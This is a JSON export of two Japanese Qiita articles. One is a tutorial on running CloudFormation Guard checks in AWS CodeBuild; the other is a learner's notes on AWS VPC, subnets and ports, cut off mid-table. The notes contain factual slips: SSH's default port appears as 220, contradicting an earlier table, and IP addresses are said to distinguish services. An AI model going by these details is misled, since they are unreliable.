      "body": "# はじめに\nこれまでの記事でいくつものAWSのDevToolsについて紹介していますが、今回はAWSCodeBuildの紹介をします。\nAWSCodeBuildはテストやソースコードのコンパイルなどの、作成物をデプロイする前のお決まりの作業を自動化するためによく利用されます。\n以前の私の記事でAWSCodeCommmitやAWSCodeDeployについて紹介していますが、AWSCodeBuildも同じCodeシリーズとしてよく紹介されます。\n\n※日本で12月に行われているQiitaアドベントカレンダーの枠が埋まったため、今回はアドベントカレンダーとは関連付けはありません。\n\n# 前提\nAWSCodePipelineやGitHubActionsなどで自動実行される設定をされることが多いと思いますが、今回の記事ではDevToolsの布教活動が目的のため、ツールの基本の使い方を紹介しています。\n\n\n# AWS CodeBuild とは\nAWSCodeBuildはS3やAWSCodeCommit,GiTHubに保存されたソースコードのコンパイルや、ユニットテストの実行などを行います。\nCI/CDを実現する際に成果物のリポジトリの反映やデプロイ前のテストやコンパイルによく使われます。\n\n↓ イメージ図はこのようになります（GoogleGeminiで生成しています）\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/e877411e-6650-4ceb-bb22-b3d7974fc7c2.png)\n\n\n# この記事で試すこと\nCloudFormationに対するテスト( AWS CloudFormation Guard)をCodeBuildで実行する\n\n## AWS CloudFormation Guard とは\nCloudFormationテンプレートの定義内容が意図した内容になっているかをテストするツール。\nyaml形式で定義のルールを記載して、そのルールとテンプレートの内容が一致しているか判定します。\n例えば、Lambda関数の「タイムアウト設定」が「90秒であること」や「90秒以下であること」などをルールとして定義できます。\n\n\n# CodeBuildの設定\n## CodeBuildプロジェクトの作成\nAWS CodeBuildのコンソール画面で「プロジェクトを作成する」を選択します\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/59ec8bcf-4bfc-44dd-8f9b-9673187ab253.png)\n\n\nプロジェクト名を入力し、今回はデフォルトプロジェクトの設定を選択します。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/47819cb0-653e-4fbd-9da2-298822505fe1.png)\n\n\nソースプロバイダは前回作成したAWSCodeCommitリポジトリを使用します。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/d2ff993e-c05b-48eb-bb81-f30b90761ddf.png)\n\n\n今回は最小限の設定でプロジェクトを作成したいため、環境イメージはマネージド型イメージ、コンピューティングはLambdaを選択します。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/c1af0e13-75ee-420d-baaa-a82955c1883e.png)\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/017d3786-d205-4316-9971-3071adca9a12.png)\n\nAWSCodeCommitのリポジトリで管理しているbuildspecファイルに従ってビルドを実行するため、「builspecファイルを使用する」を選択します\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/0a6b5518-6f04-4648-8e5c-73b04e896b73.png)\n\n\n# テスト対象物の作成\n今回はCloudFormationテンプレートに対してCfn-guardのテストを行うようにしたいので、CloudFormationテンプレートとCfn-guardのルールファイル、CodeBuild用のBuildSpecファイルを作成します。\n\n## CloudFormationテンプレート\n今回はLambda関数の定義のみを定義しておきます\nこのLambda関数は以下の定義が行われています\n- タイムアウト設定： 30(秒)\n- ランタイムバージョン： python3.9\n- ポリシーは： AWSLambdaBasicExecutionRole\n``` \nAWSTemplateFormatVersion: '2010-09-09'\nDescription: 'Lambda function CloudFormation template'\n\nResources:\n  MyLambdaFunction:\n    Type: AWS::Lambda::Function\n    Properties:\n      FunctionName: MyLambdaFunction\n      Runtime: python3.9\n      Handler: index.lambda_handler\n      Role: !GetAtt LambdaExecutionRole.Arn\n      Timeout: 30\n      Code:\n        ZipFile: |\n          def lambda_handler(event, context):\n              return {\n                  'statusCode': 200,\n                  'body': 'Hello from Lambda!'\n              }\n\n  LambdaExecutionRole:\n    Type: AWS::IAM::Role\n    Properties:\n      AssumeRolePolicyDocument:\n        Version: '2012-10-17'\n        Statement:\n          - Effect: Allow\n            Principal:\n              Service: lambda.amazonaws.com\n            Action: sts:AssumeRole\n      ManagedPolicyArns:\n        - arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole\n\nOutputs:\n  LambdaFunctionArn:\n    Description: 'Lambda Function ARN'\n    Value: !GetAtt MyLambdaFunction.Arn\n``` \n    \n\n## Cfn-guard ルールファイル\n今回はLambda関数について、以下の定義になっていることをチェックしています\n- タイムアウト設定：900秒以下\n- ランタイムバージョン：\"python3.9\", \"python3.10\", \"python3.11\", \"nodejs18.x\", \"nodejs20.x\"のいずれか\n- ポリシー：PowerUserAccess、AdministratorAccessなど過度に強いポリシーが設定されていない\n\n``` \n# Lambda function security and best practices rules\n\n# Ensure Lambda function has a timeout set\nrule lambda_timeout_check {\n    Resources.*[ Type == \"AWS::Lambda::Function\" ] {\n        Properties.Timeout exists\n        Properties.Timeout <= 900\n    }\n}\n\n# Ensure Lambda function uses supported runtime\nrule lambda_runtime_check {\n    Resources.*[ Type == \"AWS::Lambda::Function\" ] {\n        Properties.Runtime in [\"python3.9\", \"python3.10\", \"python3.11\", \"nodejs18.x\", \"nodejs20.x\"]\n    }\n}\n\n# Ensure IAM role follows least privilege\nrule iam_role_managed_policy_check {\n    Resources.*[ Type == \"AWS::IAM::Role\" ] {\n        Properties.ManagedPolicyArns exists\n        Properties.ManagedPolicyArns.* != \"arn:aws:iam::aws:policy/PowerUserAccess\"\n        Properties.ManagedPolicyArns.* != \"arn:aws:iam::aws:policy/AdministratorAccess\"\n    }\n}\n```\n\n## BuildSpec\nビルドスペックではCodeBuildの実行内容を定義しています。\n今回は以下の定義を行っています。\n### install（インストールフェーズ）\n- Rust をインストール(CloudFormation Guard は Rust で書かれています)\n- Cargo（Rust のパッケージマネージャー）の環境変数を設定\n- cfn-guard をインストール\n```\nphases:\n  install:\n    runtime-versions:\n      rust: 1.70\n    commands:\n      - echo \"Installing CloudFormation Guard...\"\n      - cargo install cfn-guard\n```\n\n\n### pre_build（ビルド前フェーズ）\n  - 開始時刻を出力\n  - cfn-guard のバージョンを確認\n    - 正しくインストールされたか検証\n```\n  pre_build:\n    commands:\n      - echo \"Pre-build phase started on `date`\"\n      - cfn-guard --version\n```\n\n### build（ビルドフェーズ）\n- CloudFormation Guard の検証を実行\n- lambda-rules.guard のルールを使って lambda-template.yaml を検証\n- --show-summary all で詳細なサマリーを表示\n\n```\n  build:\n    commands:\n      - echo \"Build phase started on `date`\"\n      - echo \"Running CloudFormation Guard validation...\"\n      - cfn-guard validate --rules lambda-rules.guard --data lambda-template.yaml --show-summary all\n```\n\n### post_build（ビルド後フェーズ）\n- 完了時刻と完了メッセージを出力\n\n```\n  post_build:\n    commands:\n      - echo \"Post-build phase completed on `date`\"\n      - echo \"CloudFormation Guard validation completed\"\n```\n### reports セクション\n- cfn-guard-report という名前でレポートを生成\n- カレントディレクトリのすべてのファイルを含める\n- パス構造を保持\n\n```\nreports:\n  cfn-guard-report:\n    files:\n      - '**/*'\n    base-directory: '.'\n    discard-paths: no\n```\n\n\n## リポジトリの内容\nフォルダ分けしてテンプレートとルールファイルを分けるなどを行ってもよいですが、今回は同じ階層に3つのファイルを配置しました。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/e733a68e-ae7a-421b-b6b0-3234b27a5b27.png)\n\n\n\n\n# ビルドを実行\n「ビルドを開始」ボタンからビルドを実行します。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/265c804d-d8c0-49cd-b90c-d2539d7cf279.png)\n\n\n:::note warn\n実行時エラーが発生\n私の環境ではクォータに関するエラーが発生しました\nAWSサポートに連絡し、数日経つと解決しました(原因は不明)\n```\nCannot have more than 0 concurrent builds on LINUX_LAMBDA_CONTAINER machines with the BUILD_LAMBDA_2GB compute type for the account\n```\n:::\n\n\n### ビルドの履歴\nビルドの状況は「ビルド履歴」に表示される「進行中」「成功」「失敗」のステータスで確認できます。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/a01099aa-e2f6-4507-a0f5-24666c21e289.png)\n\n### ビルドログ\nビルド履歴の詳細ではビルドログが確認できます。\n\n↓　ビルドログでCfn-guardのチェックがPASSしていることが確認できます。\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/e8de58b1-16c7-4e9d-8336-1588ad886a0c.png)\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/20e95d83-5859-4e85-a59e-46bd29c226b5.png)\n\n\n\n# さいごに\n今回の記事ではAWS CodeBuildを紹介しました。\nAWSCodeCommitで管理されているアセットに対してあらかじめ設定したテストを自動でテストできるので、デプロイ前の自動テストに有効です。\nAWSCodeCommit内のアセットの変更に連動してAWSCodeBUildでテストをして、場合によってはAWSCodeDeployによるデプロイを自動化するパイプラインの構成も実現できますが、それはまた別の記事で紹介します。\n\n\n# 参考\n\n\n↓ AWS CodeBuild の公式ドキュメント\n\nhttps://docs.aws.amazon.com/ja_jp/codebuild/latest/userguide/builds-working.html\n\n↓ AWS CodeBuild のBlackBelt資料(日本語)\n\nhttps://pages.awscloud.com/rs/112-TZM-766/images/20201125_AWS_BlackBelt_AWS_CodeBuild.pdf\n\n# 過去の関連記事\n\n↓ AWS CodeCommit\n\nhttps://qiita.com/Nana_777/items/a8be2eee9ee9d81326cb\n\n↓ AWS CodeDeploy\n\nhttps://qiita.com/Nana_777/items/7639c02a19b0553b3e56\n\n\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:45:45+09:00",
      "group": null,
      "id": "4ffe5e508b3eed3ff27d",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "AWS",
          "versions": []
        },
        {
          "name": "DevTools",
          "versions": []
        },
        {
          "name": "CodeCommit",
          "versions": []
        },
        {
          "name": "CodeBuild",
          "versions": []
        }
      ],
      "title": "【AWS】DevTools布教活動CodeBuild編【CodeBuild】",
      "updated_at": "2025-12-09T15:13:56+09:00",
      "url": "https://qiita.com/Nana_777/items/4ffe5e508b3eed3ff27d",
      "user": {
        "description": " ※掲載内容は個人の見解であり、所属する企業を代表するものではありません。\r\nAWS Community Builder (DevTools) / 2023-2025 AWS All Certifications Engineer / 2025 Japan AWS Top Engineer / JAWS-UG 名古屋",
        "facebook_id": "",
        "followees_count": 32,
        "followers_count": 33,
        "github_login_name": null,
        "id": "Nana_777",
        "items_count": 58,
        "linkedin_id": "naoya-yamamoto-06b918335",
        "location": "愛知県",
        "name": "山本 直弥（Nao）",
        "organization": "",
        "permanent_id": 192949,
        "profile_image_url": "https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/192949/1becda8a4f1db9e9942d9c8c0b6dd07690136680/large.png?1741483410",
        "team_only": false,
        "twitter_screen_name": "nananaonana7",
        "website_url": "https://lit.link/nao777nanaarchitect"
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<h1 data-sourcepos=\"1:1-1:83\">\n<span id=\"インフラを知っていることでアプリのシステム全体が見える\" class=\"fragment\"></span><a href=\"#%E3%82%A4%E3%83%B3%E3%83%95%E3%83%A9%E3%82%92%E7%9F%A5%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B%E3%81%93%E3%81%A8%E3%81%A7%E3%82%A2%E3%83%97%E3%83%AA%E3%81%AE%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E5%85%A8%E4%BD%93%E3%81%8C%E8%A6%8B%E3%81%88%E3%82%8B\"><i class=\"fa fa-link\"></i></a>インフラを知っていることでアプリのシステム全体が見える</h1>\n<p data-sourcepos=\"2:1-4:126\">オリジナルプロダクトの開発を進めるうえで、アプリはインフラ基盤の上で動作します。<br>\n今回はサービス全体の仕組みを理解する目的でインフラ構築にも取り組みました。<br>\nできるだけ図を使って整理し、各要素のつながりが分かりやすくなるように工夫しています。</p>\n<h2 data-sourcepos=\"6:1-6:69\">\n<span id=\"公開されたネットワークと隠されたネットワーク\" class=\"fragment\"></span><a href=\"#%E5%85%AC%E9%96%8B%E3%81%95%E3%82%8C%E3%81%9F%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E3%81%A8%E9%9A%A0%E3%81%95%E3%82%8C%E3%81%9F%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF\"><i class=\"fa fa-link\"></i></a>公開されたネットワークと隠されたネットワーク</h2>\n<h3 data-sourcepos=\"7:1-7:37\">\n<span id=\"パブリックサブネット\" class=\"fragment\"></span><a href=\"#%E3%83%91%E3%83%96%E3%83%AA%E3%83%83%E3%82%AF%E3%82%B5%E3%83%96%E3%83%8D%E3%83%83%E3%83%88\"><i class=\"fa fa-link\"></i></a>パブリックサブネット　</h3>\n<p data-sourcepos=\"8:1-9:47\"><strong>公開されたネットワーク</strong>とは、ユーザーから直接アクセス可能なネットワークのこと<br>\n　例）<a href=\"https://example.com\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">https://example.com</a> へのアクセス</p>\n<h3 data-sourcepos=\"11:1-11:37\">\n<span id=\"プライベートサブネット\" class=\"fragment\"></span><a href=\"#%E3%83%97%E3%83%A9%E3%82%A4%E3%83%99%E3%83%BC%E3%83%88%E3%82%B5%E3%83%96%E3%83%8D%E3%83%83%E3%83%88\"><i class=\"fa fa-link\"></i></a>プライベートサブネット</h3>\n<p data-sourcepos=\"12:1-13:81\"><strong>隠されたネットワーク</strong>とは、外部から直接アクセスできないネットワークのこと<br>\nプライベートな空間となるためデータベースを設置している</p>\n<table data-sourcepos=\"15:1-18:68\">\n<thead>\n<tr data-sourcepos=\"15:1-15:37\">\n<th style=\"text-align: center\" data-sourcepos=\"15:2-15:19\">ネットワーク</th>\n<th style=\"text-align: center\" data-sourcepos=\"15:21-15:26\">説明</th>\n<th style=\"text-align: center\" data-sourcepos=\"15:28-15:36\">具体例</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"17:1-17:81\">\n<td style=\"text-align: center\" data-sourcepos=\"17:2-17:16\">Webサーバー</td>\n<td style=\"text-align: center\" data-sourcepos=\"17:18-17:44\">Webサイトを提供する</td>\n<td style=\"text-align: center\" data-sourcepos=\"17:46-17:80\">開発したアプリ、Apache、OS</td>\n</tr>\n<tr data-sourcepos=\"18:1-18:68\">\n<td style=\"text-align: center\" data-sourcepos=\"18:2-18:31\">データベースサーバー</td>\n<td style=\"text-align: center\" data-sourcepos=\"18:33-18:56\">データを保存する</td>\n<td style=\"text-align: center\" data-sourcepos=\"18:58-18:67\">MySQL、OS</td>\n</tr>\n</tbody>\n</table>\n<p data-sourcepos=\"20:1-22:87\"><strong>TCP/IP</strong><br>\n構築したサーバーはネットワークにつなげて通信するため、それぞれのサーバーにIPアドレスという番号を振る必要がある<br>\nまたドメイン名でアクセスする＝DNSサーバーの設定も必要となる</p>\n<p data-sourcepos=\"24:1-24:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2F3e763ee9-a120-422e-8456-bfa46c28bd3f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0d05dbebbb259f54df4fd834234a46d1\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2F3e763ee9-a120-422e-8456-bfa46c28bd3f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0d05dbebbb259f54df4fd834234a46d1\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2F3e763ee9-a120-422e-8456-bfa46c28bd3f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=b7b2c0e5d47882b42e2f91417b55c2cc 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4052007/3e763ee9-a120-422e-8456-bfa46c28bd3f.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"26:1-29:62\"><strong>ネットワークを構成するときの基本的な仕組み</strong><br>\n①DNSサーバーにドメイン名とIPアドレスの対応を割り当てる<br>\n②IPアドレスを割り当て、データがルーターから出ていくように構成する<br>\n③ネットワークで使うIPアドレス範囲を定める</p>\n<p data-sourcepos=\"31:1-32:65\">　※NATゲートウェイ：方方向だけの通信を許す<br>\n　　DBからインターネットサーバーに接続は可能</p>\n<p data-sourcepos=\"35:1-37:62\"><strong>サブネット</strong><br>\nVPC仮想的なネットワークの領域<br>\nそのようなIPアドレス範囲を扱うかを指定する</p>\n<p data-sourcepos=\"39:1-40:72\">EC２でサーバーを作る<br>\n起動した各サーバーの個体は「インスタンス」という</p>\n<p data-sourcepos=\"42:1-44:47\"><strong>IPアドレス</strong><br>\n「0.0.0.0」～「255.255.255.255」まで<br>\nICANNという団体が一括管理している</p>\n<p data-sourcepos=\"47:1-48:68\"><strong>パブリックIPアドレス</strong><br>\nインターネットに接続する際使用されるIPアドレス</p>\n<p data-sourcepos=\"50:1-51:74\"><strong>プライベートIPアドレス</strong><br>\n社内LANやネットワークの実験時に使用されるIPアドレス</p>\n<h2 data-sourcepos=\"54:1-54:36\">\n<span id=\"ネットワークを構築する\" class=\"fragment\"></span><a href=\"#%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E3%82%92%E6%A7%8B%E7%AF%89%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>ネットワークを構築する</h2>\n<p data-sourcepos=\"55:1-55:66\">まずは簡単にAWSでネットワークを構築しました。</p>\n<h3 data-sourcepos=\"57:1-57:24\">\n<span id=\"1vpcを作成する\" class=\"fragment\"></span><a href=\"#1vpc%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>1.VPCを作成する</h3>\n<p data-sourcepos=\"58:1-60:18\">リージョンを選択する<br>\n例）AWSで一番使われている主要リージョンの1つ「オレゴン」<br>\n例）東京など</p>\n<h3 data-sourcepos=\"63:1-63:43\">\n<span id=\"2-vpcをサブネットに分割する\" class=\"fragment\"></span><a href=\"#2-vpc%E3%82%92%E3%82%B5%E3%83%96%E3%83%8D%E3%83%83%E3%83%88%E3%81%AB%E5%88%86%E5%89%B2%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>2. VPCをサブネットに分割する</h3>\n<p data-sourcepos=\"64:1-64:78\">パブックサブネットとプライベートサブネットを作成する</p>\n<h3 data-sourcepos=\"66:1-66:48\">\n<span id=\"3インターネット回線を引き込む\" class=\"fragment\"></span><a href=\"#3%E3%82%A4%E3%83%B3%E3%82%BF%E3%83%BC%E3%83%8D%E3%83%83%E3%83%88%E5%9B%9E%E7%B7%9A%E3%82%92%E5%BC%95%E3%81%8D%E8%BE%BC%E3%82%80\"><i class=\"fa fa-link\"></i></a>3.インターネット回線を引き込む</h3>\n<p data-sourcepos=\"67:1-67:75\">インターネットゲートウェイを作成、VPCにアタッチする</p>\n<h3 data-sourcepos=\"69:1-69:42\">\n<span id=\"4ルートテーブルを作成する\" class=\"fragment\"></span><a href=\"#4%E3%83%AB%E3%83%BC%E3%83%88%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>4.ルートテーブルを作成する</h3>\n<p data-sourcepos=\"70:1-72:134\">VPCと接続し、パブリックサブネットと関連付ける<br>\n「0.0.0.0/0」とインターネットゲートウェイを選択し、インターネット接続を有効化する<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2F24bba7ab-b0a3-4361-8cf7-bbf3a3b65de2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e30929e7da78806b4feefecbb2369b08\" target=\"_blank\" rel=\"nofollow noopener\"><img width=\"400\" src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2F24bba7ab-b0a3-4361-8cf7-bbf3a3b65de2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e30929e7da78806b4feefecbb2369b08\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2F24bba7ab-b0a3-4361-8cf7-bbf3a3b65de2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=5abfa999b311aed314d1fd5429930c95 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4052007/24bba7ab-b0a3-4361-8cf7-bbf3a3b65de2.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"75:1-75:30\">\n<span id=\"サーバーを構築する\" class=\"fragment\"></span><a href=\"#%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E3%82%92%E6%A7%8B%E7%AF%89%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>サーバーを構築する</h2>\n<h3 data-sourcepos=\"77:1-77:31\">\n<span id=\"インスタンスの作成\" class=\"fragment\"></span><a href=\"#%E3%82%A4%E3%83%B3%E3%82%B9%E3%82%BF%E3%83%B3%E3%82%B9%E3%81%AE%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>インスタンスの作成</h3>\n<ul data-sourcepos=\"78:1-82:0\">\n<li data-sourcepos=\"78:1-78:109\">Amazon Linux 2023(OS)を選択し、キーペア(EC2に接続するための鍵ファイル)を作成する</li>\n<li data-sourcepos=\"79:1-79:143\">パブリックIPアドレスを付与して、外部ネットワーク（自宅・職場）から EC2 に SSH 接続できるようにする</li>\n<li data-sourcepos=\"80:1-82:0\">SSHを使って遠隔からのログインで必要な設定をする<br>\nセキュリティグループ(EC2のファイアウォール)を作成する</li>\n</ul>\n<h2 data-sourcepos=\"83:1-83:21\">\n<span id=\"sshで接続する\" class=\"fragment\"></span><a href=\"#ssh%E3%81%A7%E6%8E%A5%E7%B6%9A%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>SSHで接続する</h2>\n<h3 data-sourcepos=\"84:1-84:63\">\n<span id=\"rloginでパブリックipアドレスにsshで接続する\" class=\"fragment\"></span><a href=\"#rlogin%E3%81%A7%E3%83%91%E3%83%96%E3%83%AA%E3%83%83%E3%82%AFip%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%ABssh%E3%81%A7%E6%8E%A5%E7%B6%9A%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>RLoginでパブリックIPアドレスにSSHで接続する</h3>\n<p data-sourcepos=\"85:1-85:75\">インスタンスのパブリック IPv4 アドレスが接続先となる</p>\n<h3 data-sourcepos=\"88:1-88:29\">\n<span id=\"elastic-ipを確保する\" class=\"fragment\"></span><a href=\"#elastic-ip%E3%82%92%E7%A2%BA%E4%BF%9D%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>Elastic IPを確保する</h3>\n<p data-sourcepos=\"89:1-90:101\">起動・停止を繰り返したいので、設定しました<br>\n別のIPアドレを割り当てられてしまうため、固定したいときはおすすめです</p>\n<p data-sourcepos=\"93:1-93:31\"><strong>ポート番号の考え方</strong></p>\n<p data-sourcepos=\"95:1-96:63\">ファイヤウォールで接続制限となり、通してよいデータだけを通す<br>\n　→ファイヤーウォールを設けることが効果的</p>\n<p data-sourcepos=\"98:1-98:145\">セキュリティグループのインバウンドルールをクリック、インバウンドルールでポート22(SSH)だけ通信できる</p>\n<table data-sourcepos=\"101:1-106:15\">\n<thead>\n<tr data-sourcepos=\"101:1-101:30\">\n<th style=\"text-align: center\" data-sourcepos=\"101:2-101:16\">ポート番号</th>\n<th style=\"text-align: center\" data-sourcepos=\"101:18-101:29\">サービス</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"103:1-103:10\">\n<td style=\"text-align: center\" data-sourcepos=\"103:2-103:4\">:80</td>\n<td style=\"text-align: center\" data-sourcepos=\"103:6-103:9\">HTTP</td>\n</tr>\n<tr data-sourcepos=\"104:1-104:14\">\n<td style=\"text-align: center\" data-sourcepos=\"104:2-104:5\">:443</td>\n<td style=\"text-align: center\" data-sourcepos=\"104:7-104:12\">HTTPS</td>\n</tr>\n<tr data-sourcepos=\"105:1-105:12\">\n<td style=\"text-align: center\" data-sourcepos=\"105:2-105:4\">:22</td>\n<td style=\"text-align: center\" data-sourcepos=\"105:6-105:8\">SSH</td>\n</tr>\n<tr data-sourcepos=\"106:1-106:15\">\n<td style=\"text-align: center\" data-sourcepos=\"106:2-106:6\">:3306</td>\n<td style=\"text-align: center\" data-sourcepos=\"106:8-106:13\">MySQL</td>\n</tr>\n</tbody>\n</table>\n<p data-sourcepos=\"108:1-109:79\"><strong>IPアドレスは同じサービスを区別する</strong><br>\n同じサーバー内で HTTP と HTTPS が混ざらないようにしている</p>\n<p data-sourcepos=\"111:1-111:76\"><strong>ファイアウォールやセキュリティグループ設定で必要</strong></p>\n<p data-sourcepos=\"113:1-116:111\">AWS では<br>\n「443 を開ける」→ HTTPS が通る<br>\n「80 を閉じる」→ HTTP アクセスを止める<br>\nとなり、「どのサービスを公開するか」＝「どのポートを開けるか」で制御できる</p>\n<p data-sourcepos=\"118:1-119:48\"><strong>ダイレクトの設定で必須になる</strong><br>\nHTTP → HTTPS にリダイレクトする場合</p>\n<ol data-sourcepos=\"121:1-124:0\">\n<li data-sourcepos=\"121:1-121:62\">ユーザーが http://（→ポート 80）へアクセス</li>\n<li data-sourcepos=\"122:1-122:46\">Web サーバーが受け取る（80 番）</li>\n<li data-sourcepos=\"123:1-124:0\">https://（→443 番）へ 301 リダイレクト</li>\n</ol>\n<p data-sourcepos=\"125:1-125:104\">→ このため、HTTPS を強制したい場合でも 80 番ポートは開けておく必要がある</p>\n<p data-sourcepos=\"127:1-128:61\"><strong>ロードバランサ―もポート番号を見て振り分ける</strong><br>\nAWS ALB（アプリケーションロードバランサー）</p>\n<ul data-sourcepos=\"129:1-133:0\">\n<li data-sourcepos=\"129:1-129:56\">リスナー 80 → 自動で443 へリダイレクト</li>\n<li data-sourcepos=\"130:1-133:0\">リスナー 443 → バックエンドEC2へ転送</li>\n</ul>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2F5e8e2ec7-4a01-47ac-86fb-846177573050.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=dec1849b772ae79bf40af054795d59cb\" target=\"_blank\" rel=\"nofollow noopener\"><img width=\"400\" src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2F5e8e2ec7-4a01-47ac-86fb-846177573050.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=dec1849b772ae79bf40af054795d59cb\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2F5e8e2ec7-4a01-47ac-86fb-846177573050.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=bd85b42c4606b4c1fc9d518d3448c4e7 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4052007/5e8e2ec7-4a01-47ac-86fb-846177573050.png\" loading=\"lazy\"></a>\n<p data-sourcepos=\"136:1-136:82\"><iframe id=\"qiita-embed-content__1634d2a630f91ef80bedb50057fc94b4\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1634d2a630f91ef80bedb50057fc94b4\" data-content=\"https%3A%2F%2Fdocs.aws.amazon.com%2Fja_jp%2FAWSEC2%2Flatest%2FUserGuide%2Fec2-security-groups.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h2 data-sourcepos=\"138:1-138:42\">\n<span id=\"apache-http-serverのインストール\" class=\"fragment\"></span><a href=\"#apache-http-server%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB\"><i class=\"fa fa-link\"></i></a>Apache HTTP Serverのインストール</h2>\n<table data-sourcepos=\"139:1-143:48\">\n<thead>\n<tr data-sourcepos=\"139:1-139:49\">\n<th style=\"text-align: center\" data-sourcepos=\"139:2-139:13\">サービス</th>\n<th style=\"text-align: center\" data-sourcepos=\"139:15-139:41\">デォルトポート番号</th>\n<th style=\"text-align: center\" data-sourcepos=\"139:43-139:48\">説明</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"141:1-141:46\">\n<td style=\"text-align: center\" data-sourcepos=\"141:2-141:4\">SSH</td>\n<td style=\"text-align: center\" data-sourcepos=\"141:6-141:8\">220</td>\n<td style=\"text-align: center\" data-sourcepos=\"141:10-141:45\">モート接続・サーバ管理用</td>\n</tr>\n<tr data-sourcepos=\"142:1-142:64\">\n<td style=\"text-align: center\" 